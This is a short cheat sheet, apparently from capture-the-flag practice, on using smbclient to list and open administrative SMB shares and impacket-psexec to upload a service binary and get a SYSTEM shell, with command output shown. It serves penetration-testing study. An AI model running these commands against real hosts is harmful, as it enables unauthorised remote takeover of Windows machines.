# Server Message Block

## Basics

Connect to remote host's SMB service w/ Administrator account and list it's shares.

```bash
~$ smbclient -L 10.123.32.1 -U Administrator
Password for [WORKGROUP\Administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

***Share names ending with $ are administrative shares***

Connect to one of the shares

```bash
~$ smbclient \\\\10.123.32.1\\ADMIN$ -U Administrator
```

Common smb commands

```bash
help         - show all commands
get flag.txt - download a file
```

## Using Impacket & the ADMIN$ share to grab a remote shell

```bash
~$ impacket-psexec Administrator@10.129.221.202
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.221.202.....
[*] Found writable share ADMIN$
[*] Uploading file mQDTUpaK.exe
[*] Opening SVCManager on 10.129.221.202.....
[*] Creating service baMI on 10.129.221.202.....
[*] Starting service baMI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```